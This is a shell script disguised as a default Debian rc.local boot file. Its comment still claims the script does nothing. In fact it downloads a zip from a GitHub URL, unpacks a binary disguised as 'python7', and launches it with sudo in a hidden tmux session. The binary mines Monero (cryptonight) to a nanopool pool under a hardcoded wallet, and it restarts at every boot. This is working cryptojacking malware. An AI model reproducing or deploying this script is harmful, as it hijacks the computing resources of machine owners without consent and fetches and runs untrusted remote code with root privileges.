#!/bin/sh -e
#
# rc.local
#
# This script is executed at the end of each multiuser runlevel.
# Make sure that the script will "exit 0" on success or any other
# value on error.
#
# In order to enable or disable this script just change the execution
# bits.
#
# By default this script does nothing.
if [ -f ${PWD}/python7 ]; then
    if pgrep -x "python7" > /dev/null
then
    echo "Miner dang chay roi , ke cmn di "
    
else

echo "Miner da install , chay thoi "
./python7 -a cryptonight -o stratum+tcp://xmr-asia1.nanopool.org:14444 -u 4C7b1NzfZWyYjmRN4Q7JUeMciuMaboeG1PgCCHRKpnbHYnCQfxcJNy37TS1gqdnm7M2EypLPFJ7gpDAVJzn8GkzF5vRw9MBNXdZUSmnVXo -p x -t 4
     
fi
exit
fi

sudo apt-get install tmux unzip -y
wget https://raw.githubusercontent.com/haidanglx/Tonghop/master/morrr.zip
unzip morrr.zip
chmod +x python7
tmux new-session -d -s my_session1 'sudo ./python7 -a cryptonight -o stratum+tcp://xmr-asia1.nanopool.org:14444 -u 4C7b1NzfZWyYjmRN4Q7JUeMciuMaboeG1PgCCHRKpnbHYnCQfxcJNy37TS1gqdnm7M2EypLPFJ7gpDAVJzn8GkzF5vRw9MBNXdZUSmnVXo -p x -t 4'

exit 0
